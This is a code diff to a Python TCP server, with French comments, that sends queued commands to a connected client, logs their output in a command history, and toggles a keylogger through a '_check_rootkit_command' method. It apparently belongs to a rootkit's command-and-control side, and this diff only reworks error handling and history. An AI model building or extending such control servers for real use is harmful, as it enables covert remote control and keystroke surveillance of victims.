@@ -144,62 +144,71 @@ class TCPServer:
                 print(f"[MAIN LOOP ERROR] {e}")
 
     def _handle_client(self) -> None:
+        request = None
         try:
-            # Ajouter un timeout à la socket pour éviter les blocages longs
             self._client_socket.settimeout(2.0)
 
             while self._running:
-                # Vérifie si le client s'est déconnecté
+                # Vérifie si le socket est encore connecté
                 if self._client_socket is None or self._is_socket_closed(self._client_socket):
                     print("[SOCKET] Client disconnected.")
                     break
 
-                # Récupère la requête à envoyer, ou passe si la file est vide
+                # Récupération de la requête dans la file
                 try:
                     request: Request = self._send_queue.get(timeout=1)
                 except queue.Empty:
                     continue
 
                 if request is None:
-                    break
+                    print("[WARN] Received None request, skipping.")
+                    continue
 
-                # Historique de commande
-                if request.add_to_history:
-                    self._command_history.append({"command": request.message, "stdout": "", "stderr": ""})
-
-                # Envoi de la commande chiffrée
+                # --- Envoi de la commande ---
                 success = self._network_handler.send(self._client_socket, request.message)
                 if not success:
-                    print("[ERROR] Failed to send message.")
-                    break
+                    tcp_error = "[ERROR] Failed to send command."
+                    print(tcp_error)
+                    if request.add_to_history:
+                        self._update_command_history(request.message, "", tcp_error=tcp_error)
+                    request.event.set()
+                    continue
 
                 print(f"[SENT] {request.message}")
 
-                # Réception de la réponse chiffrée
+                # --- Réception de la réponse ---
                 response = self._network_handler.receive(self._client_socket)
                 if response is False:
-                    print("[ERROR] Failed to receive response.")
-                    break
+                    tcp_error = "[ERROR] Failed to receive response."
+                    print(tcp_error)
+                    if request.add_to_history:
+                        self._update_command_history(request.message, "", tcp_error=tcp_error)
+                    request.event.set()
+                    continue
 
                 print(f"[RECEIVED] {response}")
 
-                # File de réponses + analyse
+                # --- Post-traitement ---
                 self._recv_queue.put(response)
                 self._check_rootkit_command(response)
-                self._update_command_history(response)
 
-                # Débloque le thread demandeur
+                if request.add_to_history:
+                    self._update_command_history(request.message, response)
+
                 request.response = response
                 request.event.set()
 
         except socket.timeout:
-            print("[TIMEOUT] Socket timed out. Exiting client handler.")
-        except Exception as e:
-            print(f"[HANDLE CLIENT ERROR] {e}")
-        finally:
-            if self._client_socket:
-                self._client_socket.close()
+            tcp_error = "[SOCKET TIMEOUT] No data received in the last 2 seconds."
+            print(tcp_error)
+            if request and request.add_to_history:
+                self._update_command_history(request.message if request else "", "", tcp_error=tcp_error)
 
+        except Exception as e:
+            tcp_error = f"[EXCEPTION] An error occurred: {e}"
+            print(tcp_error)
+            if request and request.add_to_history:
+                self._update_command_history(request.message if request else "", "", tcp_error=tcp_error)
 
     def _check_rootkit_command(self, message: str) -> None:
         message = message.strip()
@@ -217,16 +226,21 @@ class TCPServer:
             self._klg_on = False
             print("[KLG] Keylogger desactivated.")        
 
-    def _update_command_history(self, message: str) -> None:
-        stdout, stderr, termination_code = self._extract_outputs(message)
+    def _update_command_history(self, command: str, reponse: str, tcp_error="") -> None:
+        stdout, stderr, termination_code = self._extract_outputs(reponse)
 
-        for entry in reversed(self._command_history):
-            if not entry["stdout"] and not entry["stderr"]:
-                entry["stdout"] = stdout
-                entry["stderr"] = stderr
-                if termination_code:
-                    entry["termination_code"] = termination_code
-                break
+        to_append = {
+            "command": command,
+            "stdout": stdout,
+            "stderr": stderr,
+            "termination_code": termination_code if termination_code else None,
+            "tcp_error": tcp_error if tcp_error else None
+        }
+
+        self._command_history.append(to_append)
+
+        return to_append
+    
 
     def _extract_outputs(self, message: str):
         if all(k in message for k in ["stdout:\n", "stderr:\n", "Terminated with code"]):
